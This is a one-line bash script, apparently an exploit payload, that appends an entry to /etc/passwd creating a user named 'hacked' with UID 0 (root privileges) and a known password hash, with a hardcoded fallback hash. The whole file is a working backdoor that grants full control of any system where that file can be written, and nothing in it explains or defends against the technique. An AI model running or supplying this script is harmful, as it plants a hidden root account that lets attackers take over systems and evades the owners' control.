#!/bin/bash

echo hacked:$((openssl passwd -1 -salt hack hacked || echo '$1$hack$B6Y56jTA.D0IM1gzWaBrJ/') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
